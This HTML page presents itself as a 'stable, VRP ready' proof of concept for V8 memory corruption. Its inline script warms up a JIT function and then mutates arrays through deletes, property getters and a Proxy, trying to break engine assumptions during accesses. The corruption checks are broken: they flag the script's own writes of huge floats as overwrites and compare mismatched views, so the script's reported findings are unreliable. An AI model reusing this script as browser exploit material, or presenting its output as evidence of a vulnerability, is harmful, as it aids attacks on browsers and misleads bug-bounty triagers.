<!doctype html>
<meta charset="utf-8">
<title>V8 Memory Corruption PoC - Final</title>

<h2>V8 Memory Corruption PoC (Stable / VRP Ready)</h2>
<pre id="log"></pre>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
    console.log(m);
};

// TARGET
function vuln(a,i){ return a[i]+1.1; }

// WARMUP (cukup untuk JIT)
function warmup(){
    let arr = Array.from({length:50}, (_,i)=>i+0.5);
    for(let j=0;j<70000;j++) vuln(arr,j%50);
    return arr;
}

// MUTATION (force transitions)
function mutate(arr){
    for(let i=0;i<10;i++) delete arr[i];
    arr.length = 12;

    arr[40] = 1.7976931348623157e+308;
    arr[1] = {x:13};

    Object.defineProperty(arr,2,{
        get(){
            arr.push(13.37);
            arr.push(42.42);
            return 1.1;
        }
    });

    return arr;
}

// PROXY (deterministic, not random)
function breakAssumption(a,iter){
    return new Proxy(a,{
        get(t,p){
            if(p==="length"){
                t.push(99.99);
                t.push(88.88);
            }
            if(typeof p==="string" && !isNaN(p) && (iter % 3 === 0)){
                t.push(77.77);
            }
            return Reflect.get(t,p);
        },
        set(t,p,v){
            if(iter % 5 === 0) t.length += 2;
            return Reflect.set(t,p,v);
        }
    });
}

// BUFFER SHARED
let buf = new ArrayBuffer(0x40000);
let f64 = new Float64Array(buf);
let u32 = new Uint32Array(buf);

// INIT PATTERN
for(let i=0;i<f64.length;i++){
    f64[i] = 0x41414141 + i;
}

// MEMORY CHECK
function checkMemory(){
    for(let i=0;i<40;i++){
        let idx = (i * 7919) % f64.length;

        let v = f64[idx];
        let raw = u32[idx];

        // abnormal float / NaN
        if(!Number.isFinite(v)){
            log(`[NaN/INF] idx=${idx} val=${v}`);
        }

        // unexpected pattern mismatch
        if(raw === 0x41414141){
            log(`[ALIAS?] idx=${idx} raw=0x41414141`);
        }

        // extreme overwrite detection
        if(Math.abs(v) > 1e12){
            log(`[EXTREME] idx=${idx} val=${v}`);
        }
    }
}

// GC PRESSURE
function stressGC(){
    let tmp = [];
    for(let i=0;i<50;i++){
        tmp.push(new Array(500).fill(i));
    }
}

// MAIN
function run(){
    log("[*] warmup");
    let base = warmup();

    log("[*] fuzzing start");

    for(let i=0;i<200000;i++){
        let arr = base.slice();
        arr = mutate(arr);
        arr = breakAssumption(arr,i);

        vuln(arr,5);

        // overlay
        let idx = (i * 13) % f64.length;
        f64[idx] = 1.7976931348623157e+308;

        if(i % 1500 === 0){
            checkMemory();
            stressGC();
        }

        if(i % 5000 === 0){
            log(`iter ${i}`);
        }
    }

    log("[*] done");
}

run();
</script>
